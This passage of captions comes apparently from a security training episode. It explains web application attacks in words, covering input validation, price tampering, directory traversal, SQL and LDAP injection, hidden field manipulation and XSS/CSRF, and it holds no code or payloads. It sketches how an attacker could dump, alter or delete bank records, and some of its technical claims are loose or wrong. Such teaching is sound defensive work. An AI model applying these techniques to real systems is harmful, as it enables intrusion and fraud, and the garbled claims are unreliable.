hatch management,\n\n170\n00:08:06.960 --> 00:08:10.230\nlack of getting rid of default settings,\n\n171\n00:08:10.230 --> 00:08:13.610\nlack of hardening, all the things\nthat we would often consider there.\n\n172\n00:08:13.610 --> 00:08:15.240\nSensitive Data Exposure.\n\n173\n00:08:16.260 --> 00:08:19.920\nThis is where we are not either\nstoring data or transmitting data or\n\n174\n00:08:19.920 --> 00:08:21.580\nusing data securely.\n\n175\n00:08:21.580 --> 00:08:26.070\nSo lack of proper protocols,\nlack of encryption, things like that.\n\n176\n00:08:26.070 --> 00:08:29.890\nAlso using applications that may expose,\n\n177\n00:08:29.890 --> 00:08:34.240\neither through the use of the application\nby using it incorrectly, or\n\n178\n00:08:34.240 --> 00:08:37.830\njust because we give too much information\nor we don't handle errors correctly.\n\n179\n00:08:37.830 --> 00:08:41.090\nAll those things can lead\nto sensitive data exposure.\n\n180\n00:08:41.090 --> 00:08:45.620\nMissing function level access controls,\nthe idea here that we don't have access\n\n181\n00:08:45.620 --> 00:08:48.370\nset up the right way or\naccess controls set up the right way.\n\n182\n00:08:48.370 --> 00:08:51.570\nCross site request forgeries,\ntalk about those as well.\n\n183\n00:08:51.570 --> 00:08:55.613\nDefinitely want to zero in on, and we\ndefinitely of each in the list we build,\n\n184\n00:08:55.613 --> 00:08:58.664\nzero in on the difference between XSS and\nCSRF, subtle but\n\n185\n00:08:58.664 --> 00:09:01.238\nimportant differences\nabout how they operate.\n\n186\n00:09:01.238 --> 00:09:04.366\nAnd you wanna make sure you can\ndifferentiate between the two if you're\n\n187\n00:09:04.366 --> 00:09:06.099\nasked cuz you very likely may be asked.\n\n188\n00:09:06.099 --> 00:09:10.710\nIt's a pretty obvious choice to reference\nthose two because they are so similar.\n\n189\n00:09:10.710 --> 00:09:13.150\nUsing components with\nknown vulnerabilities.\n\n190\n00:09:13.150 --> 00:09:16.180\nYou'll obviously, if we know there's\nan insecure code library and\n\n191\n00:09:16.180 --> 00:09:20.650\nwe have a secure option, right, so C,\nas a language, suffers from this a lot.\n\n192\n00:09:20.650 --> 00:09:23.540\nYou have a lot of insecure\nlanguage libraries in C.\n\n193\n00:09:23.540 --> 00:09:25.101\nAnd then you have secure versions of them.\n\n194\n00:09:25.101 --> 00:09:27.414\nAnd I never quite, I mean,\nI understand it, but\n\n195\n00:09:27.414 --> 00:09:31.157\njust I never quite got the fact that you\nwould create a programmatic language.\n\n196\n00:09:31.157 --> 00:09:34.603\nAnd I understand at the time and\nwhy it was done and how it was done, but\n\n197\n00:09:34.603 --> 00:09:38.644\nthere is essentially a secure version of\nmost of those libraries where you put s in\n\n198\n00:09:38.644 --> 00:09:40.858\nfront of it and\nit becomes a secure version.\n\n199\n00:09:40.858 --> 00:09:43.350\nSo why would you leave insecure versions-\n&gt;&gt; Why would you leave the old ones?\n\n200\n00:09:43.350 --> 00:09:44.160\n&gt;&gt; Around?\nJust\n\n201\n00:09:44.160 --> 00:09:46.550\nforce everyone to use the secure ones.\n\n202\n00:09:46.550 --> 00:09:48.510\nWouldn't it be a better place, right?\n\n203\n00:09:48.510 --> 00:09:52.106\nBut obviously the person in charge\nmust be on vacation for, I don't know,\n\n204\n00:09:52.106 --> 00:09:54.915\n25, 30 years now, and\nthey never got around to that.\n\n205\n00:09:54.915 --> 00:09:58.140\nNobody thought that that would\nbe good to revisit and consider.\n\n206\n00:09:58.140 --> 00:10:00.400\nAnd then unvalid redirects and forwards.\n\n207\n00:10:00.400 --> 00:10:04.940\nThis is where we are potentially\nmoving information around and\n\n208\n00:10:04.940 --> 00:10:08.120\nsaying go over there, when we don't\nreally know what over there is, and\n\n209\n00:10:08.120 --> 00:10:10.980\nwe're sending you there, but\nobviously it's a manipulated code string.\n\n210\n00:10:10.980 --> 00:10:15.110\nAnd we're able to, you either masquerade\nor redirect or things like that that can\n\n211\n00:10:15.110 --> 00:10:19.390\nlead to drive-by attacks, can lead to\nmalware being injected, as we've talked\n\n212\n00:10:19.390 --> 00:10:22.700\nabout when we talked about the malware\nepisodes and some of that kind of stuff.\n\n213\n00:10:22.700 --> 00:10:25.200\nSo we do wanna make sure\nwe're aware of that.\n\n214\n00:10:25.200 --> 00:10:28.050\nWe do have a list that breaks down in\na little more detail some of the key\n\n215\n00:10:28.050 --> 00:10:30.200\nhighlighted ones that\nwe wanted to focus on.\n\n216\n00:10:30.200 --> 00:10:31.720\nI know you put that together for us and\n\n217\n00:10:31.720 --> 00:10:34.080\nactually, yep,\nright up there at the top, there we go.\n\n218\n00:10:34.080 --> 00:10:35.130\nCan we just go full screen?\n\n219\n00:10:35.130 --> 00:10:36.482\nThat way everybody can see.\n\n220\n00:10:36.482 --> 00:10:39.030\nThere, yeah, cuz otherwise you're\ngetting only every other word.\n\n221\n00:10:39.030 --> 00:10:39.998\nMake it a little tough for me.\n\n222\n00:10:39.998 --> 00:10:43.920\nObviously I could narrate through it, but\nIt's a little tough for you to be able to\n\n223\n00:10:43.920 --> 00:10:47.405\nsee it, which is one of the things I\nwant to make sure you're able to do.\n\n224\n00:10:47.405 --> 00:10:48.335\nSo let's just look here.\n\n225\n00:10:48.335 --> 00:10:50.445\nSo we did talk about\nsome of these already.\n\n226\n00:10:50.445 --> 00:10:52.345\nInput validation flaws.\n\n227\n00:10:52.345 --> 00:10:56.465\nThese are gonna be and we wrote out\na nice little explanation for you here.\n\n228\n00:10:56.465 --> 00:10:57.785\nYou can obviously go\nthrough them at length.\n\n229\n00:10:57.785 --> 00:10:59.908\nI'm gonna just summarize\nkind of a high level,\n\n230\n00:10:59.908 --> 00:11:03.030\nleave it up to you guys to download\nthe document and or to see it.\n\n231\n00:11:03.030 --> 00:11:05.500\nBut when we do input validation,\n\n232\n00:11:05.500 --> 00:11:08.250\nwhat we're doing is looking at data\nthat's coming into the system.\n\n233\n00:11:08.250 --> 00:11:12.110\nWe're trying to make sure that we\nare not gonna allow buffer overflows,\n\n234\n00:11:12.110 --> 00:11:14.080\nwe're not gonna allow injection attacks.\n\n235\n00:11:14.080 --> 00:11:18.570\nSo, yeah, the classic example here is\na web form that allows to log on, and\n\n236\n00:11:18.570 --> 00:11:24.260\nwhether or not we are putting a character\nlimit on the form entry, rith?\n\n237\n00:11:24.260 --> 00:11:26.960\nSo that way, we don't allow 5,000 errors.\n\n238\n00:11:26.960 --> 00:11:29.340\n&gt;&gt; So 255,000 characters for\nsomebody's last name, yeah.\n\n239\n00:11:29.340 --> 00:11:30.490\n&gt;&gt; Right, something like that.\n\n240\n00:11:30.490 --> 00:11:37.500\nIf we are doing, perhaps,\na username entry, right, with usernames,\n\n241\n00:11:37.500 --> 00:11:43.090\nusernames can be alphanumeric but more\noften than not, they are normally alpha.\n\n242\n00:11:43.090 --> 00:11:47.390\nAnd the only special character that we\nuse is typically if we're doing e-mail,\n\n243\n00:11:47.390 --> 00:11:48.980\nwould be at sign, right?\n\n244\n00:11:48.980 --> 00:11:53.110\nSo we would probably limit that in some\nway through validation to say yes,\n\n245\n00:11:53.110 --> 00:11:58.150\na lot of letters and numbers c uz\nadamone@company.com would be acceptable\n\n246\n00:11:58.150 --> 00:12:03.250\nfor a username, but\nadamone!@company is probably not.\n\n247\n00:12:03.250 --> 00:12:06.390\nSo we would want to limit the use\nof special characters because we\n\n248\n00:12:06.390 --> 00:12:11.060\ndon't want somebody trying to push\na malformed SQL query right through that.\n\n249\n00:12:11.060 --> 00:12:14.960\nAnd the same thing with passwords,\nalthough passwords do use, traditionally,\n\n250\n00:12:14.960 --> 00:12:19.000\ncuz we often want complex passwords,\nthey will use special characters right?\n\n251\n00:12:19.000 --> 00:12:20.990\nThey will use alpha and numeric input.\n\n252\n00:12:20.990 --> 00:12:23.450\nSo we have to be careful about\nwhat we do and we limit.\n\n253\n00:12:23.450 --> 00:12:25.495\nWe have to think about how\nwe deal with nulls, right?\n\n254\n00:12:25.495 --> 00:12:29.714\nBecause we don't declare nulls and deal\nwith them properly, we're gonna get nulls.\n\n255\n00:12:29.714 --> 00:12:33.273\nAnd the problem is, if we're not expecting\nthem, that can also cause a glitch and,\n\n256\n00:12:33.273 --> 00:12:34.830\npotentially, a liability.\n\n257\n00:12:34.830 --> 00:12:39.180\nWe may not want to allow\ndot dot dash information\n\n258\n00:12:39.180 --> 00:12:43.120\nin URLs because those lead to dot\ndot slash or dot dot dash attacks.\n\n259\n00:12:43.120 --> 00:12:45.080\nWe'll talk more about those at some point.\n\n260\n00:12:45.080 --> 00:12:47.840\nSo there's a lot of things we\nwould filter for here, right?\n\n261\n00:12:47.840 --> 00:12:50.470\nWe do boundary checking to\nmake sure that we're not\n\n262\n00:12:50.470 --> 00:12:53.760\ngetting into areas that we're not\nsupposed to go to as we input data.\n\n263\n00:12:53.760 --> 00:12:57.017\nSo there's all these different things\ninput validation flaws would help us to\n\n264\n00:12:57.017 --> 00:12:59.850\naddress, or\nlooking at them would help us to address.\n\n265\n00:12:59.850 --> 00:13:01.580\nParameter and reform tampering.\n\n266\n00:13:02.790 --> 00:13:05.140\nThis involves the manipulation,\n\n267\n00:13:05.140 --> 00:13:09.350\nlet me talk slowly, the manipulation\nof information being exchanged back and\n\n268\n00:13:09.350 --> 00:13:13.780\nforth between the user and the application\nand the server on the back end.\n\n269\n00:13:13.780 --> 00:13:16.370\nThings like credentials, we say there,\n\n270\n00:13:16.370 --> 00:13:19.620\nprice information,\nquantity, things like that.\n\n271\n00:13:19.620 --> 00:13:24.110\nIf we go in and we look at the web page\nand we pull down the code, as an attacker,\n\n272\n00:13:24.110 --> 00:13:26.300\nwe may be able to find that\nthere's a weakness in the code.\n\n273\n00:13:26.300 --> 00:13:30.710\nAnd as a result, we may be able to modify\nthe price information on a, let's say,\n\n274\n00:13:30.710 --> 00:13:32.820\na backend database for inventory.\n\n275\n00:13:32.820 --> 00:13:39.288\nOr modify the amount of\ninventory that's available.\n\n276\n00:13:39.288 --> 00:13:43.399\nSo it may say there's only\nfive things on the website.\n\n277\n00:13:43.399 --> 00:13:47.449\nWe may change that and have it say three,\nand then we may be able to\n\n278\n00:13:47.449 --> 00:13:52.110\ncorrupt the order system and get an order\nshipped for like a penny a piece.\n\n279\n00:13:52.110 --> 00:13:54.910\n&gt;&gt; That's how I got my MacBook for $2.\n\n280\n00:13:54.910 --> 00:13:56.710\n&gt;&gt; You went to Beezit too, right?\n\n281\n00:13:56.710 --> 00:13:58.890\n&gt;&gt; [LAUGH]\n&gt;&gt; I shop there all the time, right?\n\n282\n00:13:58.890 --> 00:14:04.400\nI shop there all the time,\nwhenever I time for a little SQL at foray.\n\n283\n00:14:04.400 --> 00:14:06.180\nSo you know all kidding aside, right.\n\n284\n00:14:06.180 --> 00:14:08.545\nClearly, Mike is kidding about that.\n\n285\n00:14:08.545 --> 00:14:10.800\n&gt;&gt; [LAUGH]\n&gt;&gt; That's not the the way you do things.\n\n286\n00:14:10.800 --> 00:14:15.220\nBut we know, and there are many examples\nof this, that there have been times where\n\n287\n00:14:15.220 --> 00:14:17.710\nthere was a couple of attacks\na few years back against.\n\n288\n00:14:17.710 --> 00:14:19.980\nIt wasn't actually an attack.\n\n289\n00:14:19.980 --> 00:14:22.760\nI should recant that cuz\nit was not an attack.\n\n290\n00:14:22.760 --> 00:14:24.380\nBut there was an example of this.\n\n291\n00:14:24.380 --> 00:14:27.871\nThere have been some attacks on eBay and\nsome other systems where there actually\n\n292\n00:14:27.871 --> 00:14:30.710\nwere attacks where people went and\nmanipulated pricing.\n\n293\n00:14:30.710 --> 00:14:34.650\nBut there was one, I forget which\nairline it was, it was JetBlue.\n\n294\n00:14:34.650 --> 00:14:38.811\nMaybe in JetBlue, there was one of the\nairlines where this was not an attack and\n\n295\n00:14:38.811 --> 00:14:42.230\nhad nothing to do with this per se,\nbut the outcome was the same.\n\n296\n00:14:42.230 --> 00:14:46.809\nSomebody screwed up when they were\nposting the web code for pricing.\n\n297\n00:14:46.809 --> 00:14:52.084\nAnd so they put tickets up on sale at,\nliterally, it was like $0.05 or\n\n298\n00:14:52.084 --> 00:14:57.320\nsomething crazy for somewhere from\nsomewhere to New York or whatever.\n\n299\n00:14:57.320 --> 00:15:00.630\nAnd it was up for an hour or\nwhatever it was till they caught it, and\n\n300\n00:15:00.630 --> 00:15:04.130\nall these people went and\nbought tickets because that was the price.\n\n301\n00:15:04.130 --> 00:15:06.936\nAnd then they had the issue whether or not\nthey were gonna honor the tickets, right?\n\n302\n00:15:06.936 --> 00:15:09.540\nBecause you legitimately bought\nthe ticket, but then they were saying in\n\n303\n00:15:09.540 --> 00:15:12.070\nthe beginning, no, we're not gonna\nhonor them, it was a mistake.\n\n304\n00:15:12.070 --> 00:15:14.205\nAnd there was a big uproar about it, and\n\n305\n00:15:14.205 --> 00:15:16.873\nthen ultimately they did\nhonor all the tickets.\n\n306\n00:15:16.873 --> 00:15:21.390\nAnd if you had gotten in before\nthey fixed it, you got a ticket for\n\n307\n00:15:21.390 --> 00:15:23.370\n$3 or whatever it was.\n\n308\n00:15:23.370 --> 00:15:26.540\nI think you had to actually wind up\npaying, I think what they made you do if I\n\n309\n00:15:26.540 --> 00:15:29.340\nremember correctly was, cuz there's\na certain number of taxes, federal tax and\n\n310\n00:15:29.340 --> 00:15:32.695\nstuff like that, that the airline\ncannot just essentially comp.\n\n311\n00:15:32.695 --> 00:15:37.099\nEven on a buddy pass, you have to pay\nthem because you're required to by law.\n\n312\n00:15:37.099 --> 00:15:40.987\nSo I think what they ultimately did was,\ncuz the ticket price was\n\n313\n00:15:40.987 --> 00:15:45.811\nbelow the threshold, that they actually\nsaid, okay, we'll honor them, but\n\n314\n00:15:45.811 --> 00:15:50.364\nat the lowest level price, the tax and\nfare tax and whatever would be this.\n\n315\n00:15:50.364 --> 00:15:52.162\nYou've got to pay another 25 bucks or\n\n316\n00:15:52.162 --> 00:15:55.440\nwhatever, it would be to essentially\nmake this a normal transaction.\n\n317\n00:15:55.440 --> 00:15:56.566\n&gt;&gt; Still a very discounted price.\n\n318\n00:15:56.566 --> 00:15:58.267\n&gt;&gt; Absolutely, absolutely,\nit was just really funny.\n\n319\n00:15:58.267 --> 00:16:00.900\n&gt;&gt; [LAUGH]\n&gt;&gt; It was an indirect representation of\n\n320\n00:16:00.900 --> 00:16:04.700\nthe same issue we're talking about,\nwhich is that somebody manipulated.\n\n321\n00:16:04.700 --> 00:16:08.660\nThis was done internally, it was\naccidental, it was not an attack, but\n\n322\n00:16:08.660 --> 00:16:09.510\nit was just an accident.\n\n323\n00:16:09.510 --> 00:16:10.860\nSomebody just made a mistake.\n\n324\n00:16:10.860 --> 00:16:12.540\nBut essentially the outcome was the same.\n\n325\n00:16:12.540 --> 00:16:14.950\nPrice data was manipulated and\nas a result, obviously,\n\n326\n00:16:14.950 --> 00:16:16.590\nclearly, you have an issue.\n\n327\n00:16:16.590 --> 00:16:18.880\nSo these kind of things occur and\nthey occur all the time.\n\n328\n00:16:18.880 --> 00:16:21.660\nBut there have been instances of this\nwhere people have actually manipulated\n\n329\n00:16:21.660 --> 00:16:23.050\nwebsite pricing.\n\n330\n00:16:23.050 --> 00:16:26.570\nSo let's go back to our list,\nwe have, what else do we have there?\n\n331\n00:16:26.570 --> 00:16:28.830\nDirectory traversal.\n\n332\n00:16:28.830 --> 00:16:30.470\n&gt;&gt; Yeah, directory traversal.\n\n333\n00:16:30.470 --> 00:16:36.381\nSo with directory traversal, this is\nthe ../ attack that we were talking about,\n\n334\n00:16:36.381 --> 00:16:39.460\nand the idea here is if you go and\nput in a URL,\n\n335\n00:16:39.460 --> 00:16:42.978\nhttp://www.itpro.tv, or whatever it is.\n\n336\n00:16:42.978 --> 00:16:47.296\nAnd then we instead, typically after that\nwhen it resolves, have something like\n\n337\n00:16:47.296 --> 00:16:51.740\nwelcome.aspx or whatever it may be\ndepending on the code that's being used.\n\n338\n00:16:51.740 --> 00:16:59.040\nWe can insert dots, a certain number of\ndots and slashes to manipulate the URL.\n\n339\n00:16:59.040 --> 00:17:02.600\nAnd by doing this what we're essentially\nfiguring out, and this is a trial and\n\n340\n00:17:02.600 --> 00:17:06.750\nerror mechanism because you've got to know\nthe structure of the server to figure this\n\n341\n00:17:06.750 --> 00:17:10.130\nout ahead of time and while there\nare ways we can fingerprint and\n\n342\n00:17:10.130 --> 00:17:13.850\nfootprint the server to figure it out,\nit's unlikely, most likely,\n\n343\n00:17:13.850 --> 00:17:18.370\nthat we would actually have a complete\nrecord of every directory in the structure\n\n344\n00:17:18.370 --> 00:17:19.800\nuntil we start probing a little bit.\n\n345\n00:17:19.800 --> 00:17:21.932\nSo what we often do is\nwe start probing for\n\n346\n00:17:21.932 --> 00:17:26.212\nthis by putting these additional items\ninto the URL trying to see what resolves.\n\n347\n00:17:26.212 --> 00:17:29.662\nAnd we had talked about in\nthe hacking web server episodes,\n\n348\n00:17:29.662 --> 00:17:32.160\nthe idea of the robots.txt file, right?\n\n349\n00:17:32.160 --> 00:17:36.310\nAnd the idea that we could go out,\nget this file in theory and\n\n350\n00:17:36.310 --> 00:17:39.600\nif we were able to get it,\ndepending on what systems use it.\n\n351\n00:17:39.600 --> 00:17:43.250\nBecause not every website does and\nI know we made that clear.\n\n352\n00:17:43.250 --> 00:17:46.420\nBut just reminding you of the fact that\nwhile it is a pretty standard practice\n\n353\n00:17:46.420 --> 00:17:51.340\ntoday to use a robots.txt file to exclude\ndirectories from the web crawlers,\n\n354\n00:17:51.340 --> 00:17:53.710\nthe web bots that are out there,\nnot every site does.\n\n355\n00:17:53.710 --> 00:17:56.380\nCuz there is a security\nliability with this potentially.\n\n356\n00:17:56.380 --> 00:17:59.321\nAnd so what we do this if\nwe were able to get that,\n\n357\n00:17:59.321 --> 00:18:03.602\nwe may actually be able to figure\nout what that structure looks like.\n\n358\n00:18:03.602 --> 00:18:05.610\nIt's hit and miss,\nyou don't know for sure.\n\n359\n00:18:05.610 --> 00:18:09.550\nBut if we did, or we didn't cuz we could\nwalk through trying to figure it out,\n\n360\n00:18:09.550 --> 00:18:11.560\nwe would be exposing directories, right?\n\n361\n00:18:11.560 --> 00:18:12.430\nThe dots and\n\n362\n00:18:12.430 --> 00:18:16.240\nthen the dashes represent how we're\nwalking through that structure hierarchy.\n\n363\n00:18:16.240 --> 00:18:19.100\nIf we imagine a normal file\nstructure start at the top and\n\n364\n00:18:19.100 --> 00:18:24.020\nkinda walk down hierarchically and you're\nthree or four levels deep, C, Windows,\n\n365\n00:18:24.020 --> 00:18:26.681\nSystem32, inetpub, wwwroot.\n\n366\n00:18:26.681 --> 00:18:29.042\nAnd then you start seeing\nall the sub directories and\n\n367\n00:18:29.042 --> 00:18:31.357\nyou would then be able to\nfigure out what's there.\n\n368\n00:18:31.357 --> 00:18:35.560\nAnything that is there will actually then\ncome up on the screen in the web browser\n\n369\n00:18:35.560 --> 00:18:38.901\nwith whatever browser,\nwhatever application you are using.\n\n370\n00:18:38.901 --> 00:18:43.005\nAssuming that you are able to see it, you\nwould then be able to, even at a minimum,\n\n371\n00:18:43.005 --> 00:18:45.250\nrecord what's there, understand it.\n\n372\n00:18:45.250 --> 00:18:48.381\nYou could then target that machine for\nadditional follow up attacks and\n\n373\n00:18:48.381 --> 00:18:49.433\ntry to steal that data.\n\n374\n00:18:49.433 --> 00:18:52.102\nIn some cases if we have\nnot removed web dev and\n\n375\n00:18:52.102 --> 00:18:55.210\nmodified the directory\nbrowsing permissions.\n\n376\n00:18:55.210 --> 00:18:57.340\nWe may actually be able to\ndownload those files directly,\n\n377\n00:18:57.340 --> 00:18:59.190\nwhich would be catastrophic obviously.\n\n378\n00:18:59.190 --> 00:19:00.060\nSo that'll be a bad thing.\n\n379\n00:19:00.060 --> 00:19:03.170\nSo just keep that in mind obviously\nsomething else to consider.\n\n380\n00:19:03.170 --> 00:19:04.870\nSo what else do we have here?\n\n381\n00:19:04.870 --> 00:19:06.310\n&gt;&gt; We have injection flaws.\n\n382\n00:19:06.310 --> 00:19:08.050\n&gt;&gt; Okay, so with injection flaws.\n\n383\n00:19:08.050 --> 00:19:11.800\nThis is where we're gonna actually execute\nthe SQL injection specifically, or\n\n384\n00:19:11.800 --> 00:19:16.530\nwhat we would commonly call\na SQL injection code attack or\n\n385\n00:19:16.530 --> 00:19:21.070\njust sometimes people inadvertently\nrefer to them as buffer overflows, but\n\n386\n00:19:21.070 --> 00:19:24.650\nthey are a result of injection flaws and\ninjection attacks.\n\n387\n00:19:24.650 --> 00:19:29.750\nSo what we get there is the ability\nto be able to manipulate SQL\n\n388\n00:19:29.750 --> 00:19:32.600\nstructure query language queries.\n\n389\n00:19:32.600 --> 00:19:36.810\nSend them through the web app,\nthrough the API that we're using or\n\n390\n00:19:36.810 --> 00:19:39.490\nthe web browser whatever it may be.\n\n391\n00:19:39.490 --> 00:19:43.900\nAnd as a result if the application on the\nback end is vulnerable or the application\n\n392\n00:19:43.900 --> 00:19:47.590\ndata stream hits a database that is\nvulnerable on the back end cuz these\n\n393\n00:19:47.590 --> 00:19:52.890\nattacks are more often than not executed\nagainst relational databases, right?\n\n394\n00:19:52.890 --> 00:19:57.946\nSo, whether it's Microsoft SQL,\nOracle, IBM, Informix, you name it.\n\n395\n00:19:57.946 --> 00:20:01.390\nWhatever databases that are out there,\nalmost every database on the planet\n\n396\n00:20:01.390 --> 00:20:06.050\ntoday that's an enterprise scale database\nis a relational database of some kind.\n\n397\n00:20:06.050 --> 00:20:08.410\nThat's the standard form we tend to use.\n\n398\n00:20:08.410 --> 00:20:13.730\nSo we're gonna execute this again\nsome group of or collection of or\n\n399\n00:20:13.730 --> 00:20:19.170\nassociation of these databases, probing\nand looking for weaknesses in the code.\n\n400\n00:20:19.170 --> 00:20:21.020\nWe may use SQL as I said,\n\n401\n00:20:21.020 --> 00:20:25.750\nwe may use command injection, malicious\ncode injection through a web app directly.\n\n402\n00:20:25.750 --> 00:20:28.590\nWe may use LDAP based injection,\nmalicious or\n\n403\n00:20:28.590 --> 00:20:32.480\nmanipulation of LDAP code against\nthe back end LDAP directory.\n\n404\n00:20:32.480 --> 00:20:37.740\nRemember LDAP is a protocol, but LDAP\nitself [COUGH] is really just the thought\n\n405\n00:20:37.740 --> 00:20:43.230\nprocess of using a directory services\ndatabase, to store user credentials.\n\n406\n00:20:43.230 --> 00:20:45.750\nThose databases are typically\nrelational databases, right.\n\n407\n00:20:45.750 --> 00:20:50.340\nAnd so we're able to manipulate the LDAP\nqueries to be able to, in theory,\n\n408\n00:20:50.340 --> 00:20:56.510\ninject code that could then dump the list\nof users, drop a table, deleting users.\n\n409\n00:20:56.510 --> 00:20:59.310\nRendering the database unusable and\nthe website or\n\n410\n00:20:59.310 --> 00:21:03.690\nthe application is no longer valid\nbecause you can't authenticate, right,\n\n411\n00:21:03.690 --> 00:21:05.120\nall these kind of things can happen.\n\n412\n00:21:05.120 --> 00:21:08.975\nImagine if you get into a banking site and\nimagine if you're able to dump a list of\n\n413\n00:21:08.975 --> 00:21:11.650\nall the account holders and\ntheir information.\n\n414\n00:21:11.650 --> 00:21:15.370\nAnd then you're able to, after you've\ndone that, manipulate that table,\n\n415\n00:21:15.370 --> 00:21:18.080\neither adding in ghost users, right?\n\n416\n00:21:18.080 --> 00:21:21.060\nOr, going in and\nchanging passwords, right?\n\n417\n00:21:21.060 --> 00:21:22.890\nSo you get rid of\nthe hashes that are there.\n\n418\n00:21:22.890 --> 00:21:24.660\nYou substitute them with your own.\n\n419\n00:21:24.660 --> 00:21:26.080\nThere's all these different you can do.\n\n420\n00:21:26.080 --> 00:21:27.850\nYou can modify balances.\n\n421\n00:21:27.850 --> 00:21:30.140\nImagine just the cash you could get up to,\nright?\n\n422\n00:21:30.140 --> 00:21:30.980\nAnd then when you're done,\n\n423\n00:21:30.980 --> 00:21:35.180\nyou could actually drop the table, right,\nessentially deleting all the users.\n\n424\n00:21:35.180 --> 00:21:37.760\nObviously, the bank, in theory,\nwould have a backup of that and\n\n425\n00:21:37.760 --> 00:21:39.260\nthey would be able to restore it,\nof course.\n\n426\n00:21:39.260 --> 00:21:41.680\nBut, it would cause more delay and\n\n427\n00:21:41.680 --> 00:21:45.530\nprobably trying to cover your tracks\nin the process would be part of that.\n\n428\n00:21:45.530 --> 00:21:46.130\nAll right.\n\n429\n00:21:46.130 --> 00:21:48.490\nWe may be able to do\nhidden field manipulation.\n\n430\n00:21:49.690 --> 00:21:55.010\nThis is where when as you see there, user\nmakes selections on the HTML page, right,\n\n431\n00:21:55.010 --> 00:21:58.620\nthat is gonna be stored as form field\nvalues that we essentially send back as\n\n432\n00:21:58.620 --> 00:22:02.700\ndata, right, map to the field which goes\nto a table and we line that up and say,\n\n433\n00:22:02.700 --> 00:22:07.730\nokay, username went there, right, password\nwent there, order ID went there, right?\n\n434\n00:22:07.730 --> 00:22:09.380\nSo we have all that form data.\n\n435\n00:22:09.380 --> 00:22:13.395\nWell, if we're able to,\nthrough manipulation of that,\n\n436\n00:22:13.395 --> 00:22:17.905\nactually use or get to and find and\nthen interact with hidden fields.\n\n437\n00:22:17.905 --> 00:22:21.615\nWe may be able to add data in that could\nthen either be secreted into the system.\n\n438\n00:22:21.615 --> 00:22:24.755\nUsing it to attack it or\nmanipulate data that's there, but\n\n439\n00:22:24.755 --> 00:22:25.885\nthat we don't normally see.\n\n440\n00:22:25.885 --> 00:22:28.525\nSo there's different ways that\nwe may be able to take this on.\n\n441\n00:22:28.525 --> 00:22:31.065\nWe can examine the HTML code of the page\n\n442\n00:22:31.065 --> 00:22:34.305\nbecause a lot of times developers\nwill embed hidden field values.\n\n443\n00:22:34.305 --> 00:22:36.100\nWe just don't see them normally.\n\n444\n00:22:36.100 --> 00:22:40.440\nBut they are there for control purposes or\nfor references,like if you go back and\n\n445\n00:22:40.440 --> 00:22:41.650\nsubmit that data.\n\n446\n00:22:41.650 --> 00:22:45.180\nThere's information metadata\nessentially associated with it.\n\n447\n00:22:45.180 --> 00:22:48.910\nIf the attack were confined that,\nwe then actually can go in and\n\n448\n00:22:48.910 --> 00:22:50.230\nwe can manipulate that.\n\n449\n00:22:50.230 --> 00:22:55.280\nHave you ever, and it varies by browser,\nby browser application but\n\n450\n00:22:55.280 --> 00:22:58.870\nI think in IE, it's F12,\nyou get the developer code window, right?\n\n451\n00:22:58.870 --> 00:23:02.650\nI don't know what it is in Chrome but\nyou can go through and\n\n452\n00:23:02.650 --> 00:23:06.320\npull up any page and when you do that, and\nyou hit this key, whatever the key is,\n\n453\n00:23:06.320 --> 00:23:08.690\nit gives you essentially\nthe review window.\n\n454\n00:23:08.690 --> 00:23:11.590\nYou actually are seeing all\nthe underlying code on the page.\n\n455\n00:23:11.590 --> 00:23:15.560\nAnd so if you pull up a form on a page\nlike that and you then do that,\n\n456\n00:23:15.560 --> 00:23:17.840\na lot of times we can expose\nthe hidden data that way.\n\n457\n00:23:17.840 --> 00:23:20.840\nSo it's just something to consider,\njust something to be aware of.\n\n458\n00:23:20.840 --> 00:23:24.370\nAll right, so we do have, I think\na couple more, or was that the last one.\n\n459\n00:23:24.370 --> 00:23:27.950\nOkay, now we have with the Cross-Site\nScripting, Cross-Site Request Forgeries.\n\n460\n00:23:27.950 --> 00:23:31.170\nSo, we talked about Cross-Site Scripting,\nCross-Site Request Forgeries\n\n461\n00:23:31.170 --> 00:23:35.430\nin other episodes especially in\nthe hacking web server episodes.\n\n462\n00:23:35.430 --> 00:23:36.790\nYou wanna take a look at that.\n\n463\n00:23:36.790 --> 00:23:38.052\nWeb servers I should say.\n\n464\n00:23:38.052 --> 00:23:42.974\nWe've talked about it a little bit in the,\nif I'm not mistaken, we talked\n\n465\n00:23:42.974 --> 00:23:47.978\nabout it a little bit certainly Probably\nreferenced it in some of the earlier\n\n466\n00:23:47.978 --> 00:23:53.350\nepisodes with regards to going out and\ndoing reconnaissance and footprinting.\n\n467\n00:23:53.350 --> 00:23:58.922\nWe would have mentioned it, at least in\npassing in probably session hijacking.\n\n468\n00:23:58.922 --> 00:24:03.320\nAnd in some of the discussions\nwe had around malware in terms\n\n469\n00:24:03.320 --> 00:24:05.090\nof fact that malware may lead to this.\n\n470\n00:24:05.090 --> 00:24:07.440\nSo we talked about it in different places,\nright?\n\n471\n00:24:07.440 --> 00:24:10.760\nMaking sure we have a sense of\nthe difference between the two\n\n472\n00:24:10.760 --> 00:24:11.390\nis very important.\n\n473\n00:24:11.390 --> 00:24:14.790\nWe have a nice little set of definitional\nitems there for you on each one.\n\n474\n00:24:14.790 --> 00:24:17.130\nBe good for\nyou to understand the difference.\n\n475\n00:24:17.130 --> 00:24:19.930\nWhen we do cross-site\nscripting attacks remember\n\n476\n00:24:19.930 --> 00:24:21.600\nwe're going in as you can see there.\n\n477\n00:24:21.600 --> 00:24:25.270\nAnd we're trying to enable malicious\nattackers to essentially inject\n\n478\n00:24:25.270 --> 00:24:29.530\nscripts into the webpages being\nviewed by others from the website.\n\n479\n00:24:29.530 --> 00:24:33.760\nSo they'll go into null essentially, hack\na website, put malicious code there first.\n\n480\n00:24:33.760 --> 00:24:36.048\nSo this is the precursor to the attack,\n\n481\n00:24:36.048 --> 00:24:40.020\nthey'll prepare the targeted\nwebsite they want users to visit.\n\n482\n00:24:40.020 --> 00:24:41.950\nRight?\nThen when the user comes there,\n\n483\n00:24:41.950 --> 00:24:44.920\nthere's exploit code that\nwill then inject malware or\n\n484\n00:24:44.920 --> 00:24:47.350\nsomehow take control of the user browser.\n\n485\n00:24:47.350 --> 00:24:51.810\nAnd either allow them to be redirected\nto another site or execute a back door.\n\n486\n00:24:51.810 --> 00:24:54.770\nThere's all these different things that\ncan occur, it really just depends, right?\n\n487\n00:24:54.770 --> 00:24:56.670\nSo we wanna make sure\nwe're familiar with this.\n\n488\n00:24:56.670 --> 00:24:59.130\nWhatever the malicious script is,\nyou can see examples 